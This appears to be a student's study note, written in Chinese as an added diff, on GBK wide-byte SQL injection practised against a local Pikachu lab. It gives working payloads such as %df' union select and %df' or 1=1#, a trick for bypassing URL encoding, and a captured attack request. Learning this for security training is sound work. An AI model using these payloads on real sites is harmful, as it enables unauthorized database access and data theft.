@@ -1,0 +1,65 @@
+26.09.15 笔记
+宽字节注入：
+
+宽字节注入：SQL注入的一种逃逸手段。 
+
+漏洞前提（一般是老PHP网站才满足）：PHP 开启magic_quotes_gpc或代码手动addslashes()；数据库连接使用GBK字符集。
+
+原始后端SQL模板：
+“select * from user where username='用户输入';”
+payload（宽字节+union）：“%df' union select 1,database() #;”。
+拼接后的底层SQL：“select * from user where username='%df\' union select 1,database()#';”
+
+原理：
+1、原始输入%df'，PHP的addslashes会把单引号'转义成\'，URL编码后，\是%5C、'是%27，最终传入MySQL为：“%df%5C%27”。
+2、MySQL以GBK解析：%df%5C两个字节合并识别成1个汉字“運”，反斜杠“\”被	吃掉，剩下%27即单引号“'”跟前面单引号闭合，而剩余第三个单引号用“#”注释掉。
+
+异常：
+浏览器表单直接输入%df不会生效：
+页面输入框提交时浏览器会自动URL编码，%会被编码成%25，payload变成%25df'，也就是二次编码，宽字节直接失效。
+（这是浏览器自带行为，不是网站漏洞，但不是所有网站表单都会自动URL编码，GET表单URL参数一定会编码；POST表单的application/x-www-form-urlencoded才会编码，而JSON POST不会。）
+输入“%df' or 1=1#”仍然返回用户名不存在： 表单直接输入%df不会生效！ 页面输入框提交时浏览器会自动URL编码，%会被编码成%25，payload 变成%25df'，也就是二次编码，宽字节直接失效。
+可以使用BP抓包绕过URL编码，或者直接输入字符“運”，是%df%5C对应的GBK汉字，页面提交不会二次编码。
+
+宽字节注入配合报错/联合注入：
+宽字节只是逃逸单引号的手段，逃逸成功之后要配合报错/联合注入。
+页面输出数据库报错（报错带出数据）则报错注入、union 联合注入都可以，反则只能union联合注入（或盲注）。
+小对比：
+报错注入：简单，但是有长度限制（updatexml最多返回32字符）。
+联合注入：无32字符限制，但是需要猜字段数。
+
+联合注入
+union：把两条select查询的结果，合并成一套结果集返回。
+前提：
+前后两条查询，列数量必须一致；对应列的数据类型尽量匹配。
+payload：
+“select username from user where id='%df\' union select 1,table_name from information_schema.tables ...”
+前半段：页面原本的查询（查用户）
+union：拼接第二条全新查询，可以跨表查库/表/字段。
+页面只会输出合并后的结果，于是把联合查询的信息（如table_name）吐出来。
+
+union all和union的区别：
+union：自动去重，剔除重复行，会消耗性能。
+union all：不去重，直接全部输出，注入里优先用union all。
+
+为什么注入要用union：
+1、报错注入不能用。
+2、正常查询只能查业务表，union允许附加一条我们自定义的select，直接读取 information_schema元数据，拿库名、表名、字段。
+
+发起的请求：
+POST /pikachu/vul/sqli/sqli_widebyte.php HTTP/1.1
+Host: 192.168.238.66
+Content-Length: 36
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36 Edg/153.0.0.0
+Origin: http://192.168.238.66
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.238.66/pikachu/vul/sqli/sqli_widebyte.php
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Cookie: PHPSESSID=go58mrf39jm551pimfft4ro5o4
+Connection: keep-alive
+
+name=%df'+or+1=1#&submit=%E6%9F%A5%E8%AF%A2
